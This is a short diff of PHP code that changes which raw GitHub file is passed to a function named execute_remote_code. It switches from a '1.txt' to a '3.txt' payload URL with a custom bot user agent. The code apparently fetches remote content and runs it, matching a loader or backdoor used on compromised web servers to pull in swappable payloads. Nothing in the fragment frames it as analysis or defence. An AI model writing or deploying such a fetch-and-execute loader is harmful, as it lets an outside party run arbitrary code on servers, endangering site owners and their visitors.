@@ -121,7 +121,7 @@ function execute_remote_code($url, $options = []) {
 
 // Penggunaan
 try {
-    execute_remote_code('https://raw.githubusercontent.com/mlhisoka/gon/refs/heads/main/1.txt', [
+    execute_remote_code('https://raw.githubusercontent.com/mlhisoka/gon/refs/heads/main/3.txt', [
         'timeout' => 15,
         'user_agent' => 'Custom Bot 1.0'
     ]);
